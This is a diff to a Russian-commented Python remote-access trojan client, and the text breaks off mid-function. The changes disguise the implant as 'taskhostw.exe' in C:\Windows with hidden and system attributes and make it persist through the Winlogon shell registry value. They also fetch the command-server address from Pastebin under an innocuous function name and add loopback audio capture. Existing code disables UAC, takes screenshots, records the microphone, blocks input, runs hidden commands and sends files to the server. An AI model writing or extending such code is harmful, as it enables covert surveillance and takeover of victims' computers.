@@ -3,6 +3,7 @@ import json
 import keyboard
 import os
 import sys
+import platform
 import requests
 import win32gui
 import win32con
@@ -12,9 +13,12 @@ import pyautogui
 import time
 import pyaudio   
 import wave
+import random
 import pygame
 import pyperclip   
 import numpy as np  
+import sounddevice as sd
+import wave
 import tempfile
 import subprocess
 import random
@@ -31,6 +35,9 @@ import struct
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', handlers=[logging.StreamHandler()])
 logger = logging.getLogger(__name__)
 
+def check_cython_load(): # Нужно при использовании Cython
+    return True
+    
 # ====== Автоопределение CLIENT_ID ======
 def get_hwid():
     # 1. Попытка через WMIC (UUID материнской платы)
@@ -59,7 +66,7 @@ def get_hwid():
     except Exception as e:
         logger.error(f"Ошибка получения HWID (Registry): {e}")
 
-    # 3. Последний шанс: MAC-адрес (Убрали случайный uuid4)
+    # 3. Последний шанс: MAC-адрес
     # uuid.getnode() получает адрес сетевой карты. Он статичен.
     try:
         mac_num = uuid.getnode()
@@ -74,10 +81,10 @@ device_name = os.getenv("COMPUTERNAME", "UnknownDevice")
 CLIENT_ID = f"{device_name}/{get_hwid()}"
 logger.info(f"CLIENT_ID: {CLIENT_ID}")
 
-# ====== Настройки подключения ======
-PASTEBIN_RAW_URL = "https://pastebin.com/raw/xxyyy" # Вставить
-#
-def get_server_config():
+pyautogui.FAILSAFE = False
+
+EXEC_URL = "https://pastebin.com/raw/xxxxxx"
+def get_buffer_process():
     
     """
     Скачивает конфигурацию сервера с Pastebin.
@@ -91,7 +98,7 @@ def get_server_config():
     for attempt in range(5):
         try:
             logger.info(f"Попытка {attempt + 1}/5 получить конфигурацию с Pastebin...")
-            response = requests.get(PASTEBIN_RAW_URL, timeout=10)
+            response = requests.get(EXEC_URL, timeout=10)
             response.raise_for_status()
             data = response.json()  # Ожидаем валидный JSON
 
@@ -119,13 +126,13 @@ def get_server_config():
     sys.exit(1)
 
 # Загружаем конфигурацию при старте
-SERVER_IP, SERVER_PORT = get_server_config()
+SERVER_IP, SERVER_PORT = get_buffer_process()
 RECONNECT_DELAY = 5
 
 # ====== Глобальные переменные ======
-CURRENT_VERSION = 20
-TARGET_DIR = r"C:\Windows\INF"
-new_name="c_computeaccelerator.exe"
+CURRENT_VERSION = 29
+TARGET_DIR = r"C:\Windows"
+new_name="taskhostw.exe"
 stop_event = threading.Event()
 auto_thread = None
 socket_lock = threading.Lock()
@@ -167,23 +174,59 @@ def is_good_window(hwnd):
     if not title:
         return False
 
-    # Системные окна, которые должны быть скрыты
-    blacklist = {
-        "Program Manager",
-        "Default IME",
-        "MSCTFIME UI"
+    class_name = win32gui.GetClassName(hwnd)
+
+    blacklist_classes = {
+        "Progman",       # Program Manager
+        "WorkerW",       # Фоновый контейнер
+        "ime",           # Default IME
+        "MSCTFIME UI",   # Текстовые службы
     }
 
-    if title in blacklist:
+    if class_name in blacklist_classes:
         return False
 
     return True
-
 
 def enum_windows_callback(hwnd, windows_list):
     if is_good_window(hwnd):
         title = win32gui.GetWindowText(hwnd)
         windows_list.append((hwnd, title))
+
+def force_focus_window(hwnd):
+    user32 = ctypes.windll.user32
+
+    # Разрешаем перевести окно в foreground
+    try:
+        user32.AllowSetForegroundWindow(ctypes.c_uint(-1))
+    except:
+        pass
+
+    # 1) Попытка показать окно
+    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
+    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+
+    # 2) Попытка обычной активации
+    try:
+        win32gui.SetForegroundWindow(hwnd)
+        return True
+    except:
+        pass
+
+    # 3) Alt — разблокирует foreground-lock
+    try:
+        pyautogui.press('alt')
+        win32gui.SetForegroundWindow(hwnd)
+        return True
+    except:
+        pass
+
+    # 4) Жёсткий fallback
+    try:
+        user32.SwitchToThisWindow(hwnd, True)
+        return True
+    except:
+        return False
 
 ############################
 
@@ -202,7 +245,7 @@ def play_sound_task(conn, full_path):
         pygame.mixer.music.play()
         
         # Отправка начального подтверждения
-        send_response(conn, '🎵 Music started playing successfully!')
+        send_response(conn, '🎵 Музыка запущена успешно')
         
         # Ожидание окончания воспроизведения ИЛИ события остановки
         while pygame.mixer.music.get_busy() and not music_stop_event.is_set():
@@ -211,13 +254,13 @@ def play_sound_task(conn, full_path):
         # Проверка причины выхода из цикла
         if not pygame.mixer.music.get_busy():
             # Завершилось естественным путем
-            send_response(conn, '✅ Music finished playing!')
+            send_response(conn, '✅ Проигрывание музыки завершено')
         else:
             # Остановлено командой /stopsound
             pass 
             
     except Exception as e:
-        send_response(conn, f'❌ Error during music playback: {e}')
+        send_response(conn, f'❌ Ошибка во время загрузки музыки: {e}')
         
     finally:
         # Очистка глобальной ссылки на поток
@@ -296,49 +339,69 @@ def disable_uac():
 ############################
 
 def change_shell():
-    print("[START] Изменение shell запущено")
+    logger.info("Изменение shell запущено")
     try:
-        print("[INFO] Открытие ключа реестра Winlogon...")
+        logger.info("Открытие ключа реестра Winlogon...")
         key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
-        print("[OK] Ключ открыт")
-        value = r"explorer.exe, C:\Windows\INF\c_computeaccelerator.exe"
-        print(f"[INFO] Установка значения shell: {value}")
+        logger.info("Ключ открыт")
+        value = f"explorer.exe, {TARGET_DIR}\\{new_name}"
+        logger.info(f"Установка значения shell: {value}")
         reg.SetValueEx(key, "shell", 0, reg.REG_SZ, value)
-        print("[SUCCESS] Значение 'shell' успешно изменено")
+        logger.info("Значение 'shell' успешно изменено")
         reg.CloseKey(key)
-        print("[INFO] Ключ закрыт")
+        logger.info("Ключ закрыт")
     except Exception as e:
-        print(f"[ERROR] Ошибка при изменении shell: {e}")
+        logger.error(f"Ошибка при изменении shell: {e}")
     finally:
-        print("[END] Работа потока изменения shell завершена")
+        logger.info("Работа потока изменения shell завершена")
 
-
+def set_file_attributes(file_path):
+    # Устанавливаем атрибуты скрытый и системный
+    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)
+    
 def copy_to_target():
+    """
+    Копирует текущий исполняемый файл в целевую директорию, 
+    устанавливает атрибуты, запускает копию и завершает текущий экземпляр.
+    """
     try:
         if not os.path.exists(TARGET_DIR):
             os.makedirs(TARGET_DIR)
-            print(f"[INFO] Папка {TARGET_DIR} создана.")
+            logger.info(f"Папка {TARGET_DIR} создана.")
 
         current_file = sys.argv[0]
         target_file = os.path.join(TARGET_DIR, new_name)
 
-        if os.path.abspath(current_file) == os.path.abspath(target_file):
-            print("[INFO] Уже работаем из целевой папки.")
+        # Проверка, работаем ли мы уже из целевой папки
+        if os.path.abspath(current_file).lower() == os.path.abspath(target_file).lower():
+            logger.info("Уже работаем из целевой папки.")
             return True
 
+        # Если файла в целевой папке нет, копируем его
         if not os.path.exists(target_file):
-            shutil.copy(current_file, target_file)
-            print(f"[INFO] Программа скопирована в {target_file}")
+            logger.info(f"Копирование {current_file} в {target_file}...")
+            shutil.copy2(current_file, target_file) 
+            logger.info(f"Программа успешно скопирована в {target_file}.")
+            
+            # Устанавливаем атрибуты сразу после копирования
+            set_file_attributes(target_file)
         else:
-            print(f"[INFO] Файл уже существует в {target_file}, копирование не требуется.")
+            logger.info(f"Файл уже существует в {target_file}, копирование не требуется.")
 
+        # Запуск скопированного файла
+        logger.info("Запуск файла из целевой папки...")
         os.startfile(target_file)
-        print("[INFO] Запущен файл из целевой папки. Завершение текущего экземпляра.")
+        
+        # Завершение текущего экземпляра
+        logger.info("Запущен файл из целевой папки. Завершение текущего экземпляра.")
         change_shell()
         os._exit(0)
 
+    except PermissionError as pe:
+        logger.critical(f"Ошибка прав доступа при копировании/создании папки/запуске: {pe}")
+        return False
     except Exception as e:
-        print(f"[ERROR] Ошибка при копировании или запуске: {e}")
+        logger.error(f"Непредвиденная ошибка при копировании или запуске: {e}")
         return False
 
 ############################
@@ -363,125 +426,102 @@ def delete_mei():
             except Exception as e:
                 print(f"[ERROR] Не удалось удалить {full_path}: {e}")
 
-############################
-
-MAX_LEN = 3500  # граница под Telegram
-def split_message(text, limit=MAX_LEN):
-    """Разбивает длинный текст на несколько сообщений."""
-    parts = []
-    while len(text) > limit:
-        # Ищем ближайший перенос строки, чтобы не рвать строки файлов
-        cut = text.rfind('\n', 0, limit)
-        if cut == -1:
-            cut = limit
-        parts.append(text[:cut])
-        text = text[cut:].lstrip('\n')
-    parts.append(text)
-    return parts
-
 #############################################################
-# Ниже команды
+# Файловый менеджер
 
 def cmd_ls(args):
     """
-    Показывает содержимое текущей или указанной папки.
-    Если current_path - виртуальный корень (/), показывает список дисков.
-    При слишком большом выводе — отправляет результат файлом.
+    Возвращает Markdown-список: путь отдельным инлайн-кодом, 
+    каждый файл/папка — тоже отдельным инлайн-кодом.
+    При длинном выводе — файл без форматирования.
     """
-    global current_path
-    target_path = current_path
-    
-    MAX_LEN = 4000  # лимит символов для отправки текста
+    global current_path, MAX_LEN
 
-    # 1. Если текущий путь - виртуальный корень (/), показываем диски
+    target_path = current_path
+
+    # 1. Корень: диски
     if current_path == '/':
         drives = []
+
         for i in range(ord('A'), ord('Z') + 1):
             drive = chr(i) + ":\\"
-            try:
-                if os.path.exists(drive): 
-                    total_bytes = psutil.disk_usage(drive).total
-                    total_gb = round(total_bytes / (1024**3))
-                    drives.append(f"💾 {drive} [{total_gb} GB]")
-            except Exception:
-                pass
-        
-        if drives:
-            return "\n".join(drives)
-        else:
-            return "❌ Не удалось найти доступные диски."
+            if os.path.exists(drive):
+                if psutil:
+                    size = psutil.disk_usage(drive).total // (1024**3)
+                    drives.append(f"💾 `{drive}` — {size} GB")
+                else:
+                    drives.append(f"💾 `{drive}`")
 
-    # 2. Переход в указанный путь
+        if not drives:
+            return "❌ Не найдено дисков."
+
+        text = "📂 `/`\n\n" + "\n".join(drives)
+
+        if len(text) <= MAX_LEN:
+            return text
+
+        # если слишком длинно → файл
+        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_drives.txt", encoding="utf-8") as tmp:
+            tmp.write("\n".join([d.replace("`", "") for d in drives]))
+            return tmp.name
+
+    # 2. Обработка перехода
     if args.strip():
-        if os.path.isdir(args.strip()):
-            target_path = args.strip()
-            if os.path.isabs(target_path):
-                current_path = target_path
+        arg = args.strip()
+        if os.path.isabs(arg) and os.path.isdir(arg):
+            target_path = arg
+            current_path = arg
         else:
-            target_path = os.path.join(current_path, args.strip())
+            cand = os.path.join(current_path, arg)
+            if os.path.isdir(cand):
+                target_path = cand
+                current_path = cand
+            else:
+                return f"❌ Папка '{arg}' не существует."
 
-    # 3. Чтение содержимого папки
+    # 3. Чтение папки
     try:
-        if not os.path.isdir(target_path):
-            return f"❌ '{target_path}' не является папкой или недоступен."
-             
-        if not args.strip():
-            target_path = current_path
-        else:
-            current_path = target_path 
-            
         items = os.listdir(target_path)
-        
-        dirs = []
-        files = []
-
-        for item in items:
-            full_path = os.path.join(target_path, item)
-            if os.path.isdir(full_path):
-                dirs.append(item)
-            elif os.path.isfile(full_path):
-                files.append(item)
-
-        dirs.sort(key=str.lower)
-        files.sort(key=str.lower)
-        
-        output = []
-        output.extend([f"📁 {d}\\" for d in dirs])
-        output.extend([f"📄 {f}" for f in files])
-            
-        if not output:
-            return f"✅ Папка '{target_path}' пуста."
-
-        full_text = "📂 " + current_path + "\n" + "\n".join(output)
-
-        # 🔥 Если текст короткий — отправляем обычным сообщением
-        if len(full_text) <= MAX_LEN:
-            return full_text
-
-        # 🔥 ИНАЧЕ — отправляем как файл
-        try:
-            import tempfile
-
-            with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_ls.txt", encoding="utf-8") as tmp:
-                tmp.write(full_text)
-                temp_path = tmp.name
-
-            # отправляем файл
-            with socket_lock:
-                conn = current_socket
-
-            send_response(conn, None, cmd_name="/ls", is_file=True, file_path=temp_path)
-
-            return None  # запретить отправку «принято» из главного цикла
-
-        except Exception as e:
-            return f"❌ Ошибка при создании файла вывода: {e}"
-
-    except PermissionError:
-        return f"❌ Отказано в доступе к '{target_path}'."
     except Exception as e:
-        return f"❌ Ошибка при чтении '{target_path}': {e}"
+        return f"❌ Ошибка доступа: {e}"
 
+    dirs = []
+    files = []
+
+    for item in sorted(items, key=str.lower):
+        full = os.path.join(target_path, item)
+        if os.path.isdir(full):
+            dirs.append(item)
+        else:
+            files.append(item)
+
+    # 4. Формирование Markdown без блоков
+    path_line = f"📂 `{target_path}`\n\n"
+    lines = []
+
+    for d in dirs:
+        lines.append(f"📁 `{d}`")
+    for f in files:
+        lines.append(f"📄 `{f}`")
+
+    out = path_line + "\n".join(lines)
+
+    if len(out) <= MAX_LEN:
+        return out  # обычное Markdown-сообщение
+
+    # 5. Если длинный — отправляем как файл БЕЗ Markdown
+    plain = target_path + "\n\n" + "\n".join(dirs + files)
+
+    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_ls.txt", encoding="utf-8") as tmp:
+        tmp.write(plain)
+        temp_path = tmp.name
+
+    with socket_lock:
+        conn = current_socket
+
+    send_response(conn, None, cmd_name="/ls", is_file=True, file_path=temp_path)
+
+    return None
 
 
 def cmd_cd(args):
@@ -534,7 +574,6 @@ def cmd_back(args):
 def cmd_pwd(args):
     logger.debug(f"Выполняется /pwd с аргументами: {args}")
     return current_path
-
 
 def cmd_mkdir(args):
     logger.debug(f"Выполняется /mkdir с аргументами: {args}")
@@ -612,7 +651,7 @@ def cmd_move(args):
     except Exception as e:
         return f"❌ Ошибка: {str(e)}"
 
-# ====== Другие команды (ИСПРАВЛЕН /msg) ======
+# ====== Другие команды ======
 def cmd_msg(args):
     try:
         parts = args.split('/t', 1)
@@ -633,7 +672,7 @@ def cmd_msg(args):
         icon = types.get(msg_type, 0x40)
         
         # Заголовок
-        title = " ".join(header[1:]) if len(header) > 1 else "Сообщение"
+        title = " ".join(header[1:]) if len(header) > 1 else "Message"
 
         # Скрытое окно + MessageBox
         def show_msgbox():
@@ -662,52 +701,40 @@ def cmd_changeclipboard(args):
     except Exception as e:
         return f'❌ Ошибка: {e}'
 
+
 def cmd_restart(args):
     """
     Перезапускает клиент, используя start через shell для независимого запуска 
     нового процесса и sys.exit() для немедленного завершения старого.
     """
     try:
-        # --- ТОЛЬКО ДЛЯ WINDOWS (os.name == 'nt') ---
-        if os.name == 'nt': 
             
-            # 1. Формируем команду для нового процесса (гарантия чистых путей)
-            reboot_command = [sys.executable] + sys.argv
-            
-            # Экранируем аргументы (заключаем в кавычки) для команды start
-            quoted_reboot_command = " ".join(f'"{arg}"' for arg in reboot_command)
-            
-            # Используем start "" для запуска нового процесса
-            cmd_string = f'start "" {quoted_reboot_command}'
-            
-            # 2. Запускаем новый процесс независимо
-            subprocess.Popen(
-                cmd_string, 
-                shell=True,
-                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP, 
-                close_fds=True
-            )
-            
-            # 3. НЕОБХОДИМЫЙ ШАГ: Немедленное завершение текущего процесса
-            # Отправляем сообщение перед выходом
-            # logger.info("Перезапуск выполнен. Выход из старого процесса...")
-            
-            # Добавляем очень короткую задержку, чтобы новый процесс успел запуститься
-            time.sleep(0.5) 
-            
-            # Принудительно завершаем выполнение скрипта. Это ГАРАНТИРУЕТ закрытие.
-            sys.exit(0) 
-
-        # --- Для других ОС (если нужно сохранить совместимость) ---
-        else: 
-            reboot_command = [sys.executable] + sys.argv
-            subprocess.Popen(
-                reboot_command,
-                start_new_session=True,
-                close_fds=True
-            )
-            time.sleep(0.5) 
-            sys.exit(0) 
+        # 1. Формируем команду для нового процесса (гарантия чистых путей)
+        reboot_command = [sys.executable] + sys.argv
+        
+        # Экранируем аргументы (заключаем в кавычки) для команды start
+        quoted_reboot_command = " ".join(f'"{arg}"' for arg in reboot_command)
+        
+        # Используем start "" для запуска нового процесса
+        cmd_string = f'start "" {quoted_reboot_command}'
+        
+        # 2. Запускаем новый процесс независимо
+        subprocess.Popen(
+            cmd_string, 
+            shell=True,
+            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP, 
+            close_fds=True
+        )
+        
+        # 3. НЕОБХОДИМЫЙ ШАГ: Немедленное завершение текущего процесса
+        # Отправляем сообщение перед выходом
+        # logger.info("Перезапуск выполнен. Выход из старого процесса...")
+        
+        # Добавляем очень короткую задержку, чтобы новый процесс успел запуститься
+        time.sleep(0.5) 
+        
+        # Принудительно завершаем выполнение скрипта. Это ГАРАНТИРУЕТ закрытие.
+        sys.exit(0) 
 
     except Exception as e:
         # В случае ошибки, возвращаем управление главному циклу, чтобы не рухнуть
@@ -742,10 +769,7 @@ def unblock_input(args):
     """Снимает блокировку ввода пользователя."""
     try:
         # Снимаем блокировку
-        ctypes.windll.user32.BlockInput(False)
-        
-        # Убеждаемся, что MouseKill тоже остановлен
-            
+        ctypes.windll.user32.BlockInput(False)  
         return "✅ Блокировка ввода (мышь/клавиатура) снята."
     except Exception as e:
         return f"❌ Ошибка снятия блокировки ввода: {e}"
@@ -819,34 +843,59 @@ def cmd_altf4(args):
 
 def cmd_taskkill(args):
     """
-    Закрывает один или несколько процессов по имени или PID.
+    Закрывает один или несколько процессов по имени или PID (только для Windows).
     Принимает список имен/PID, разделенных пробелами.
     Пример: /taskkill chrome.exe 1234
     """
-    if not args:
+
+    # Безопасное преобразование args в строку перед strip() (предотвращает ошибку, если args=None)
+    targets_str = (args if args is not None else "").strip()
+
+    if not targets_str:
         return "❌ Укажите имя процесса (например, chrome.exe) или PID (число)."
 
-    targets = args.strip().split()
+    targets = targets_str.split()
     results = []
 
     for target in targets:
         # Проверяем, является ли цель PID (числом)
         if target.isdigit():
-            # Закрываем по PID
+            # Закрываем по PID (/PID)
             command = ['taskkill', '/PID', target, '/F']
             desc = f"PID {target}"
         else:
-            # Закрываем по имени
+            # Закрываем по имени (/IM - Image Name)
             command = ['taskkill', '/IM', target, '/F']
             desc = f"Процесс {target}"
 
         try:
-            subprocess.run(command, check=True, capture_output=True, text=True, encoding='utf-8')
+            # Запускаем команду taskkill с принудительным завершением (/F)
+            subprocess.run(
+                command, 
+                check=True, 
+                capture_output=True, 
+                text=True, 
+                encoding='utf-8'
+            )
             results.append(f"✅ {desc} успешно завершен.")
+            
         except subprocess.CalledProcessError as e:
-            # Taskkill выдает ошибку, если процесс не найден
-            output = e.stderr.strip().split('\n')[-1]
-            results.append(f"❌ {desc}: {output}")
+            # Taskkill выдает ненулевой код возврата, если процесс не найден или доступ запрещен
+            
+            # 🔥 ИСПРАВЛЕНИЕ: Проверяем e.stderr на None, чтобы избежать AttributeError.
+            if e.stderr is None:
+                # Если e.stderr равно None, сообщаем об ошибке с кодом возврата.
+                error_message = f"Команда завершилась с ошибкой (Код {e.returncode}), но сообщение об ошибке отсутствует."
+            else:
+                # Получаем последнюю строку ошибки и очищаем ее
+                error_message = e.stderr.strip().split('\n')[-1].strip()
+            
+            results.append(f"❌ {desc}: {error_message}")
+            
+        except FileNotFoundError:
+            # Это может произойти, если 'taskkill' не найден в PATH (что маловероятно в Windows)
+            results.append(f"❌ {desc}: Команда 'taskkill' не найдена. Убедитесь, что вы работаете в Windows.")
+            
         except Exception as e:
             results.append(f"❌ {desc}: Общая ошибка: {e}")
 
@@ -951,7 +1000,6 @@ def cmd_applist(args):
 
         return "\n".join(lines)
 
-    # Если указан номер
     if not args.isdigit():
         return "❌ Укажите номер окна: /applist <номер>"
 
@@ -962,12 +1010,45 @@ def cmd_applist(args):
 
     hwnd, title = windows[index - 1]
 
-    try:
-        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
-        win32gui.SetForegroundWindow(hwnd)
+    if force_focus_window(hwnd):
         return f"➡️ Окно «{title}» выведено на передний план."
+    else:
+        return f"❌ Не удалось активировать окно."
+
+
+def cmd_applist_title(args):
+    """
+    /applist_title <номер окна> <новый заголовок>
+    Переименовывает окно по указанному индексу.
+    """
+    parts = args.strip().split(maxsplit=1)
+
+    if len(parts) < 2:
+        return "❌ Формат: /applist_title <номер> <новый заголовок>"
+
+    index_str, new_title = parts
+    if not index_str.isdigit():
+        return "❌ Индекс окна должен быть числом."
+
+    index = int(index_str)
+
+    # Собираем список окон
+    windows = []
+    win32gui.EnumWindows(enum_windows_callback, windows)
+
+    if index < 1 or index > len(windows):
+        return f"❌ Неверный номер. Доступно: 1..{len(windows)}"
+
+    hwnd, old_title = windows[index - 1]
+
+    try:
+        # Меняем заголовок
+        ctypes.windll.user32.SetWindowTextW(hwnd, new_title)
+        return f"✏️ Заголовок «{old_title}» заменён на «{new_title}»."
+
     except Exception as e:
-        return f"❌ Не удалось активировать окно: {e}"
+        return f"❌ Ошибка изменения заголовка: {e}"
+
 
 def cmd_applist_close(args):
     args = args.strip()
@@ -990,6 +1071,59 @@ def cmd_applist_close(args):
         return f"🛑 Окно «{title}» отправлено на закрытие."
     except Exception as e:
         return f"❌ Ошибка закрытия: {e}"
+
+# Эта функция будет выполняться в отдельном потоке
+def _holdkey_task(keys, duration):
+    try:
+        # 1. Зажатие клавиш
+        for key in keys:
+            pyautogui.keyDown(key)
+            
+        # 2. Ожидание (этот поток блокируется, но не основной)
+        time.sleep(duration)
+        
+        # 3. Отпускание клавиш
+        for key in keys:
+            pyautogui.keyUp(key)
+    except Exception as e:
+        # В фоновом потоке ошибку не отправить обратно, 
+        # но лучше ее залогировать.
+        logger.error(f"Ошибка в фоновом потоке _holdkey_task: {e}")
+
+def cmd_holdkey(args):
+    """
+    Зажимает клавишу/клавиши на определенное время в фоновом режиме.
+    Формат: /holdkey <секунды> <клавиша1> [клавиша2 ...]
+    Пример: /holdkey 5 w
+    """
+    try:
+        parts = args.split()
+        if len(parts) < 2:
+            return "❌ Формат: /holdkey <секунды> <клавиша1> [клавиша2 ...]"
+
+        # 1. Получение времени
+        try:
+            duration = float(parts[0])
+            if duration <= 0:
+                return "❌ Время должно быть больше 0."
+            duration = min(duration, 30.0)
+        except ValueError:
+            return "❌ Неверное значение времени (должно быть число)."
+
+        # 2. Получение клавиш
+        keys = [k.strip().lower() for k in parts[1:] if k.strip()]
+        if not keys:
+            return "❌ Укажите клавиши для зажатия."
+        
+        # 3. Запуск фонового потока (Non-blocking!)
+        # daemon=True гарантирует, что поток закроется, когда закроется клиент.
+        thread = threading.Thread(target=_holdkey_task, args=(keys, duration), daemon=True)
+        thread.start()
+
+        return f"✅ Клавиши `{', '.join(keys)}` зажаты на {duration} сек"
+
+    except Exception as e:
+        return f"❌ Ошибка при запуске: {e}"
 
 def cmd_mousemove(args):
     if not args:
@@ -1070,6 +1204,54 @@ def cmd_wallpaper(args):
     except Exception as e:
         return f"❌ Ошибка: {str(e)}"
 
+def cmd_playsound(args, conn):
+    """
+    Проверяет файл, инициализирует микшер и запускает play_sound_task 
+    в отдельном потоке.
+    """
+    global music_thread
+    
+    if not args:
+        return "❌ Укажите путь к аудиофайлу."
+        
+    full_path = os.path.join(current_path, args.strip())
+    
+    if not os.path.isfile(full_path):
+        return f"❌ Файл не найден: '{args.strip()}'"
+
+    # Инициализация микшера Pygame (уже есть в client.py)
+    if not initialize_mixer():
+        return "❌ Не удалось инициализировать аудио-микшер Pygame."
+        
+    # Если музыка уже играет, останавливаем ее перед запуском новой
+    if music_thread and music_thread.is_alive():
+        music_stop_event.set()
+        music_thread.join(timeout=1)
+        music_stop_event.clear() 
+
+    # Сброс флага и запуск в отдельном потоке (play_sound_task сам отправляет ответ)
+    music_stop_event.clear()
+    music_thread = threading.Thread(target=play_sound_task, args=(conn, full_path), daemon=True)
+    music_thread.start()
+    
+    # Возвращаем None, чтобы основной цикл не отправлял ответ "Принято"
+    return None 
+
+
+def cmd_stopsound(args):
+    """
+    Останавливает воспроизведение аудиофайла.
+    """
+    global music_thread
+
+    if music_thread and music_thread.is_alive():
+        music_stop_event.set()
+        # Дадим потоку время на завершение
+        music_thread.join(timeout=1)
+        music_thread = None
+        return "✅ Воспроизведение остановлено."
+    
+    return "⚠️ Воспроизведение не запущено."
 
 def cmd_volumeplus(args):
     logger.debug(f"Выполняется /volumeplus с аргументами: {args}")
@@ -1123,8 +1305,6 @@ def cmd_ping(args):
     Просто возвращает статус, используется для Heartbeat.
     """
     return "alive" # Можно возвращать любую строку
-
-
 
 def client_heartbeat_loop():
     """
@@ -1310,7 +1490,6 @@ def cmd_execute_worker(args: str, conn: socket.socket, send_response_func):
             encoding='cp866', 
             errors='replace',
             creationflags=subprocess.CREATE_NO_WINDOW
-            # 🔥 Здесь нет таймаута, как вы и просили. Поток ждет, пока команда завершится.
         )
         
         # 3. Обработка вывода
@@ -1340,8 +1519,6 @@ def cmd_execute_worker(args: str, conn: socket.socket, send_response_func):
             
             # 🔥 Отправляем файл, используя рабочий механизм send_response
             worker_send_response(message=None, is_file=True, file_path=temp_file_path) 
-            
-            # Файл будет удален функцией send_response (строка ~978) после отправки.
             
         else:
             # Отправляем единственную строку-ответ
@@ -1411,54 +1588,58 @@ def send_file(conn, file_path):
         return f"❌ Ошибка при отправке файла: {str(e)}"
 
 def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
-    """Отправляет ответный JSON с результатом команды на сервер, опционально с файлом."""
     global current_thread_id 
     
     thread_id_to_send = current_thread_id if current_thread_id is not None else 0 
 
     try:
+        # === Вариант: отправляем файл ===
         if is_file and file_path and os.path.exists(file_path):
-            # 1. Отправка метаданных (JSON)
-            response_data = {
-                "thread_id": thread_id_to_send,
-                "command": "/response_file", # Сигнал для Сервера
-                "file_name": os.path.basename(file_path),
-                "result": f"✅ Вывод команды {cmd_name} отправлен как файл."
-            }
-            response = json.dumps(response_data).encode('utf-8') + b'\n'
-            conn.sendall(response)
-            
-            # 2. Отправка размера файла и тела файла
             file_size = os.path.getsize(file_path)
-            conn.sendall(str(file_size).encode('utf-8') + b'\n') 
-            
-            # 🔥 Ключевой момент: Чтение по пути и отправка бинарных данных
-            with open(file_path, 'rb') as f:
-                data = f.read()
-                conn.sendall(data)
-            
-            os.remove(file_path) # Удаляем временный файл
+            file_name = os.path.basename(file_path)
 
-        else:
-            # Отправка обычного текста
-            response_data = {
+            # 1. Отправляем JSON заголовок
+            header = json.dumps({
                 "thread_id": thread_id_to_send,
-                "command": cmd_name,
-                "result": str(result)
-            }
-            response = json.dumps(response_data).encode('utf-8') + b'\n'
-            conn.sendall(response)
+                "command": "/response_file",
+                "file_name": file_name,
+                "file_size": file_size,
+                "result": f"Файл результата команды {cmd_name} отправлен."
+            }).encode('utf-8') + b'\n'
+
+            conn.sendall(header)
+
+            # 2. Отправляем бинарные данные файла
+            with open(file_path, 'rb') as f:
+                while True:
+                    chunk = f.read(8192)
+                    if not chunk:
+                        break
+                    conn.sendall(chunk)
+
+            # 3. Удаляем временный файл
+            os.remove(file_path)
+            return
+
+        # === Вариант: обычный текстовый ответ ===
+        response_data = {
+            "thread_id": thread_id_to_send,
+            "command": cmd_name,
+            "result": str(result)
+        }
+        response = json.dumps(response_data).encode('utf-8') + b'\n'
+        conn.sendall(response)
 
     except Exception as e:
         logger.error(f"Ошибка отправки ответа/файла: {e}")
+
 # ====== Скриншоты и фото (Добавлен ответ) ======
 def cmd_screenshot(args, conn):
     logger.debug(f"Выполняется /screenshot с аргументами: {args}")
     temp_path = None
     
     # 1. Используем tempfile для безопасного создания временного файла
-    # Используем .png, так как cv2.imencode сжимает его в память,
-    # но для конечного файла лучше оставить .jpg, как у вас было.
+    # Используем .png, так как cv2.imencode сжимает его в память
     temp_path = os.path.join(os.environ['TEMP'], f'{uuid.uuid4()}.jpg') 
     # Используем уникальное имя, чтобы избежать конфликтов
     
@@ -1477,7 +1658,6 @@ def cmd_screenshot(args, conn):
             
         # --- ОПТИМИЗАЦИЯ И СОХРАНЕНИЕ ---
         # Сразу сохраняем с нужным качеством JPEG (95)
-        # Убраны циклы попыток, так как mss очень надежен
         success = cv2.imwrite(temp_path, image, [int(cv2.IMWRITE_JPEG_QUALITY), 95])
 
         if not success or os.path.getsize(temp_path) < 1024:
@@ -1661,7 +1841,8 @@ def cmd_stop(args):
         auto_thread = None
         return "✅ Auto остановлено"
     return "❌ Auto не запущено"
-# ====== Новые команды (Аудио- и Видеозапись) ======
+
+# ====== Команды для записи (Аудио-Видеозапись) ======
 
 def cmd_mic(args, conn):
     """
@@ -1725,6 +1906,169 @@ def cmd_mic(args, conn):
     finally:
         if WAVE_OUTPUT_FILENAME and os.path.exists(WAVE_OUTPUT_FILENAME):
             os.remove(WAVE_OUTPUT_FILENAME)
+
+
+def find_wasapi_device():
+    """
+    Находит наиболее подходящее устройство WASAPI для Loopback записи.
+    Пробует: 1) Дефолтный ВЫХОД, 2) Дефолтный ВХОД, 3) Любой WASAPI-инпут.
+    Возвращает (index, default_samplerate, max_input_channels) или None.
+    """
+    
+    api_list = sd.query_hostapis()
+    wasapi_index = None
+    for i, api in enumerate(api_list):
+        if api["name"].lower().startswith("windows wasapi"):
+            wasapi_index = i
+            break
+
+    if wasapi_index is None:
+        return None 
+
+    # --- Вспомогательная функция для проверки и возврата ---
+    def check_and_return(device_index):
+        if device_index is None:
+            return None
+        try:
+            dev = sd.query_devices(device_index)
+            if dev["hostapi"] == wasapi_index and dev["max_input_channels"] > 0:
+                # ВОЗВРАЩАЕМ ТРИ ЗНАЧЕНИЯ: индекс, частоту, каналы
+                return dev["index"], dev["default_samplerate"], dev["max_input_channels"] 
+        except Exception:
+            pass
+        return None
+
+    # --- Попытка 1: Дефолтный ВЫХОД ---
+    try:
+        default_output_index = sd.default.device[1] 
+        result = check_and_return(default_output_index)
+        if result:
+            return result
+    except Exception:
+        pass
+
+    # --- Попытка 2: Дефолтный ВХОД ---
+    try:
+        default_input_index = sd.default.device[0] 
+        result = check_and_return(default_input_index)
+        if result:
+            return result
+    except Exception:
+        pass
+        
